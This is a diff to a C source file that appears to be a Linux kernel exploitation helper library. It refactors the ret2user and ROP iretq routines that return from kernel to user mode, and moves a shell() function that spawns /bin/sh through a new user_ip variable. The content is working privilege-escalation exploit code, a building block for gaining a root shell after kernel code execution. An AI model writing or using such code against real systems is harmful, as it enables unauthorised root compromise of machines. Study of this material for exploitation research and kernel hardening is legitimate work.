@@ -222,10 +222,17 @@ struct msgbuf *peek_msgseg(int msgid, size_t size) {
 #ifdef USE_ROP
 #include <unistd.h>
 
+void shell() {
+  char *argv[] = {"/bin/sh", NULL};
+  char *envp[] = {NULL};
+  execve("/bin/sh", argv, envp);
+}
+
 unsigned long user_cs;
 unsigned long user_ss;
 unsigned long user_sp;
 unsigned long user_rflags;
+unsigned long user_ip = (unsigned long)shell;
 
 void save_state() {
   asm(".intel_syntax noprefix;"
@@ -235,12 +242,6 @@ void save_state() {
       "pushf;"
       "pop user_rflags;"
       ".att_syntax;");
-}
-
-void shell() {
-  char *argv[] = {"/bin/sh", NULL};
-  char *envp[] = {NULL};
-  execve("/bin/sh", argv, envp);
 }
 
 unsigned long prepare_kernel_cred;
@@ -263,18 +264,15 @@ void ret2user() {
       "push r15;"
       "mov r15, user_cs;"
       "push r15;"
-      "mov r15, shell;"
+      "mov r15, user_ip;"
       "push r15;"
       "iretq;"
       ".att_syntax;");
 }
 
-void rop_iretq(unsigned long *p, void *rip) {
-  if (!rip) {
-    rip = (void *)shell;
-  }
-
-  *p++ = (unsigned long)rip;
+void rop_iretq(unsigned long *p, unsigned long iretq) {
+  *p++ = iretq;
+  *p++ = user_ip;
   *p++ = user_cs;
   *p++ = user_rflags;
   *p++ = user_sp;
